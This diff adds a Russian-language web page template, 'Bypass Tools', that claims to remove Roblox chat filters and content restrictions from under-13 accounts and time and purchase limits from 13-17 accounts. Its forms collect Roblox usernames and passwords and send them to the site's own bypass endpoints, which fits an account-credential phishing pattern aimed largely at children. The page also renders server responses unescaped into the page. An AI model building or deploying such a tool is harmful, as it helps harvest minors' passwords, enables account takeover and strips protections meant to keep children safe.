@@ -1,0 +1,152 @@
+{% extends "base.html" %}
+
+{% block content %}
+<div class="card">
+    <h2>🔓 Bypass Tools</h2>
+    <p>Обход ограничений для Roblox аккаунтов</p>
+    
+    <div class="bypass-section">
+        <h3>🎯 Bypass 13- Accounts</h3>
+        <p class="section-description">Для аккаунтов младше 13 лет - снимает чат ограничения и фильтры контента</p>
+        
+        <div class="input-group">
+            <input type="text" id="username-13minus" class="neon-input" placeholder="Username">
+            <input type="password" id="password-13minus" class="neon-input" placeholder="Password">
+        </div>
+        <button class="neon-button" onclick="bypass13Minus()">
+            🚀 Bypass 13-
+        </button>
+        <div id="result-13minus" class="results-container"></div>
+    </div>
+    
+    <div class="bypass-section">
+        <h3>🎯 Bypass 13-17 Accounts</h3>
+        <p class="section-description">Для аккаунтов 13-17 лет - снимает ограничения по времени и покупкам</p>
+        
+        <div class="input-group">
+            <input type="text" id="username-1317" class="neon-input" placeholder="Username">
+            <input type="password" id="password-1317" class="neon-input" placeholder="Password">
+        </div>
+        <button class="neon-button" onclick="bypass1317()">
+            🚀 Bypass 13-17
+        </button>
+        <div id="result-1317" class="results-container"></div>
+    </div>
+</div>
+
+<script>
+function bypass13Minus() {
+    const username = document.getElementById('username-13minus').value;
+    const password = document.getElementById('password-13minus').value;
+    const resultDiv = document.getElementById('result-13minus');
+    
+    if (!username || !password) {
+        resultDiv.innerHTML = '<div class="result-item result-invalid">Заполните все поля!</div>';
+        return;
+    }
+    
+    resultDiv.innerHTML = '<p>🔄 Выполняем bypass... Подождите</p>';
+    
+    fetch('/api/bypass_13_minus', {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({
+            credentials: {username, password}
+        })
+    })
+    .then(response => response.json())
+    .then(data => {
+        if (data.status === 'success') {
+            resultDiv.innerHTML = `
+                <div class="result-item result-valid">
+                    <div class="result-header">
+                        <strong>✅ Bypass успешно выполнен!</strong>
+                    </div>
+                    <div class="result-details">
+                        <p>${data.message}</p>
+                        <div class="privileges-list">
+                            <strong>Удаленные ограничения:</strong>
+                            <ul>
+                                ${data.restrictions_removed.map(item => `<li>${item}</li>`).join('')}
+                            </ul>
+                            <strong>Новые привилегии:</strong>
+                            <ul>
+                                ${data.new_privileges.map(item => `<li>${item}</li>`).join('')}
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+            `;
+        } else {
+            resultDiv.innerHTML = `
+                <div class="result-item result-invalid">
+                    <strong>❌ Ошибка!</strong><br>
+                    ${data.message}
+                </div>
+            `;
+        }
+        updateUserStats();
+    })
+    .catch(error => {
+        resultDiv.innerHTML = '<div class="result-item result-invalid">Ошибка соединения</div>';
+    });
+}
+
+function bypass1317() {
+    const username = document.getElementById('username-1317').value;
+    const password = document.getElementById('password-1317').value;
+    const resultDiv = document.getElementById('result-1317');
+    
+    if (!username || !password) {
+        resultDiv.innerHTML = '<div class="result-item result-invalid">Заполните все поля!</div>';
+        return;
+    }
+    
+    resultDiv.innerHTML = '<p>🔄 Выполняем bypass... Подождите</p>';
+    
+    fetch('/api/bypass_13_17', {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({
+            credentials: {username, password}
+        })
+    })
+    .then(response => response.json())
+    .then(data => {
+        if (data.status === 'success') {
+            resultDiv.innerHTML = `
+                <div class="result-item result-valid">
+                    <div class="result-header">
+                        <strong>✅ Bypass успешно выполнен!</strong>
+                    </div>
+                    <div class="result-details">
+                        <p>${data.message}</p>
+                        <div class="privileges-list">
+                            <strong>Удаленные ограничения:</strong>
+                            <ul>
+                                ${data.restrictions_removed.map(item => `<li>${item}</li>`).join('')}
+                            </ul>
+                            <strong>Новые привилегии:</strong>
+                            <ul>
+                                ${data.new_privileges.map(item => `<li>${item}</li>`).join('')}
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+            `;
+        } else {
+            resultDiv.innerHTML = `
+                <div class="result-item result-invalid">
+                    <strong>❌ Ошибка!</strong><br>
+                    ${data.message}
+                </div>
+            `;
+        }
+        updateUserStats();
+    })
+    .catch(error => {
+        resultDiv.innerHTML = '<div class="result-item result-invalid">Ошибка соединения</div>';
+    });
+}
+</script>
+{% endblock %}
